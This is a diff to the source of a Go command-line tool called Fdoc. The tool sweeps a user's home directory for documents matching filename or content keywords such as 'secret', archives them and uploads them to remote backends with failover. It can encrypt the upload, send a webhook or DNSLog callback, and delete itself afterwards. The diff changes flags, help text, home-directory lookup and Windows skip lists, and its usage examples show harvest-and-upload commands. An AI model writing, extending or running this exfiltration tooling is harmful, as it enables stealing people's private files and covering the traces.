@@ -38,7 +38,7 @@ type FlagInfo struct {
 	DNS        string
 	TaskID     string
 	CBTimeout  time.Duration
-	// ProgressInterval is NoBar upload/encrypt tick period; 0 disables; default 3m via flag.
+	// ProgressInterval is NoBar upload/encrypt tick period; 0 disables; default 30s via flag.
 	ProgressInterval time.Duration
 	Scrub            bool
 	Encrypt          bool
@@ -55,7 +55,11 @@ func (info *FlagInfo) InitFlag() {
 	info.applyDefaultSkipDirs()
 	info.checkDirectory(info.RootPath, "directory does not exist")
 	if !info.Size {
-		info.checkFileExistence(info.OutputPath, "output archive already exists, choose another path")
+		if info.Force {
+			_ = os.Remove(info.OutputPath)
+		} else {
+			info.checkFileExistence(info.OutputPath, "output archive already exists, choose another path (or -force)")
+		}
 	}
 	info.logDebugInfo()
 }
@@ -167,7 +171,8 @@ func (info *FlagInfo) GetFlag() {
 	flag.StringVar(&info.RootPath, "d", "", "scan root (default: home)")
 	flag.StringVar(&info.SkipDirs, "x", "", "dirs to skip (comma-separated)")
 	flag.StringVar(&info.FileName, "f", "", "filename contains (comma = OR)")
-	flag.StringVar(&info.Keyword, "k", "", "file content contains (comma = OR)")
+	flag.StringVar(&info.Keyword, "k", "", "file content contains (comma = OR); prefer -keyword")
+	flag.StringVar(&info.Keyword, "keyword", "", "file content contains (comma = OR)")
 	flag.StringVar(&info.Extension, "e", "documents", "ext filter: documents|all|any|pdf,txt,...")
 	flag.BoolVar(&info.Size, "size", false, "only measure size, do not pack")
 	flag.BoolVar(&info.Quiet, "q", false, "quiet")
@@ -175,17 +180,17 @@ func (info *FlagInfo) GetFlag() {
 
 	flag.BoolVar(&info.Upload, "upload", false, "upload archive after packing")
 	flag.StringVar(&info.Backend, "b", "", "upload backend (default: auto)")
-	flag.BoolVar(&info.Force, "force", false, "allow flaky upload backends")
+	flag.BoolVar(&info.Force, "force", false, "overwrite -o archive; allow flaky upload backends")
 	flag.StringVar(&info.Webhook, "webhook", "", "HTTPS callback URL (optional)")
 	flag.StringVar(&info.DNS, "dns", "", "DNSLog domain for callback (optional)")
 	flag.StringVar(&info.TaskID, "task-id", "", "callback task id (auto if empty)")
 	var cbTimeoutSec float64
 	flag.Float64Var(&cbTimeoutSec, "cb-timeout", 15, "callback timeout seconds")
 	var progressIntervalMin float64
-	flag.Float64Var(&progressIntervalMin, "progress-interval", 3, "minutes between upload/encrypt progress lines when no bar (0=off)")
+	flag.Float64Var(&progressIntervalMin, "progress-interval", 0.5, "minutes between upload/encrypt progress lines when no bar (default 0.5=30s; 0=off)")
 	flag.BoolVar(&info.Scrub, "scrub", false, "delete archive + self after success")
 	flag.BoolVar(&info.Encrypt, "encrypt", false, "encrypt before upload (needs -key)")
-	flag.StringVar(&info.EncryptKey, "key", "", "encrypt key (with -encrypt; not -k)")
+	flag.StringVar(&info.EncryptKey, "key", "", "encrypt key (with -encrypt; not -k/-keyword)")
 
 	flag.Parse()
 	info.CBTimeout = time.Duration(cbTimeoutSec * float64(time.Second))
@@ -210,6 +215,7 @@ failover callback. -encrypt requires -upload and -key (decrypt with Fdoc decrypt
 
 Usage:
   Fdoc [flags]
+  Fdoc backends
   Fdoc decrypt [flags] <cipher>
 
 Examples:
@@ -218,9 +224,10 @@ Examples:
   Fdoc -d /data -o out.tgz -upload -q
   Fdoc -d /data -o out.tgz -upload -webhook https://host/hook -scrub
   Fdoc -d /data -e zip -f secret -max-file 0 -max 10GB -upload -encrypt -key SECRET -b gg
+  Fdoc backends
   Fdoc decrypt -key SECRET -o out.tgz cipher.bin
 
-Filters (-e/-f/-k/-t) are AND; comma lists inside one flag are OR.
+Filters (-e/-f/-k/-keyword/-t) are AND; comma lists inside one flag are OR.
 Default: -e documents, -max 1GB, -max-file 100MB.
 Exit: 0 ok, 1 error, 2 hit -max (partial kept). Docs: README.md / README.zh-CN.md
 
@@ -230,9 +237,9 @@ INPUT:
    -x string                 directories to skip, comma-separated (replaces OS defaults if set)
 
 FILTERING:
-   -e string                 ext filter: documents|all|any|pdf,txt,zip,... (default "documents")
+   -e string                 ext filter: documents|all|any|pdf,txt,zip,... (default "documents"; all≠any)
    -f string                 filename contains (comma = OR)
-   -k string                 file content contains (comma = OR)
+   -k, -keyword string       file content contains (comma = OR); prefer -keyword (-k≠-key)
    -t string                 only files modified on/after date (YYYY-MM-DD)
 
 PACK:
@@ -240,14 +247,14 @@ PACK:
    -max string               stop packing after this total size (default "1GB")
    -max-file string          skip a single file larger than this (default "100MB"; 0=off)
    -size                     measure matched size only; do not pack
+   -force                    overwrite existing -o; also allow flaky/down upload backends
 
 UPLOAD:
    -upload                   after packing, upload archive (auto backend by size)
-   -b string                 pin upload backend (default: auto probe+failover)
-   -force                    allow flaky/down upload backends
+   -b string                 pin upload backend (default: auto; see Fdoc backends)
    -encrypt                  encrypt stream before upload (requires -upload and -key)
-   -key string               encryption key for -encrypt (not the same as -k)
-   -progress-interval float  minutes between upload/encrypt progress lines when no bar (default 3; 0=off)
+   -key string               encryption key for -encrypt (not the same as -k/-keyword)
+   -progress-interval float  minutes between upload/encrypt progress lines when no bar (default 0.5=30s; 0=off)
 
 CALLBACK:
    -webhook string           optional HTTPS callback URL (POST JSON; http only for loopback)
@@ -260,7 +267,7 @@ CLEANUP:
 
 OUTPUT:
    -q                        quiet (human logs off; machine lines still print)
-   -v                        verbose (matched paths + upload probe/retry details)
+   -v                        verbose (matched paths + per-backend probe OK/FAIL)
 `)
 }
 
@@ -268,13 +275,55 @@ func (info *FlagInfo) initRootPath() {
 	if info.RootPath != "" {
 		return
 	}
-	currentUser, err := user.Current()
+	home, err := resolveHomeDir()
 	if err != nil {
-		logx.Warning("failed to get current user: %v", err)
+		logx.Warning("failed to resolve home directory: %v", err)
 		os.Exit(1)
 	}
-	logx.Debug("user home: %s", currentUser.HomeDir)
-	info.RootPath = currentUser.HomeDir
+	logx.Debug("user home: %s", home)
+	info.RootPath = home
+}
+
+// resolveHomeDir returns the user home directory.
+// Order: os.UserHomeDir → USERPROFILE/HOME env → user.Current().HomeDir.
+func resolveHomeDir() (string, error) {
+	if home, err := os.UserHomeDir(); err == nil && home != "" {
+		return home, nil
+	}
+	if home := strings.TrimSpace(os.Getenv("USERPROFILE")); home != "" {
+		return home, nil
+	}
+	if home := strings.TrimSpace(os.Getenv("HOME")); home != "" {
+		return home, nil
+	}
+	u, err := user.Current()
+	if err != nil {
+		return "", err
+	}
+	if u.HomeDir == "" {
+		return "", fmt.Errorf("empty home directory")
+	}
+	return u.HomeDir, nil
+}
+
+// DefaultWindowsSkipDirs returns skip paths relative to the user home
+// (aligned with darwin/linux defaults). When scanning a whole drive, pass
+// absolute system dirs via -x explicitly.
+func DefaultWindowsSkipDirs() string {
+	return strings.Join([]string{
+		`AppData\Local\Temp`,
+		`AppData\Local\Microsoft\Windows\INetCache`,
+		`AppData\Local\Microsoft\Windows\History`,
+		`AppData\Local\Microsoft\Windows\Explorer`,
+		`AppData\Local\Packages`,
+		`AppData\Local\CrashDumps`,
+		`AppData\Local\D3DSCache`,
+		`AppData\Local\npm-cache`,
+		`AppData\Local\pip\Cache`,
+		`AppData\Roaming\npm-cache`,
+		`.cache`,
+		`.docker`,
+	}, ",")
 }
 
 func (info *FlagInfo) applyDefaultSkipDirs() {
@@ -283,7 +332,7 @@ func (info *FlagInfo) applyDefaultSkipDirs() {
 	}
 	switch runtime.GOOS {
 	case "windows":
-		info.SkipDirs = `C:\Windows,C:\Program Files,C:\Program Files (x86),C:\inetpub,C:\Users\Public`
+		info.SkipDirs = DefaultWindowsSkipDirs()
 	case "darwin":
 		// Skip bulky / TCC-protected trees that commonly yield "operation not permitted".
 		info.SkipDirs = strings.Join([]string{
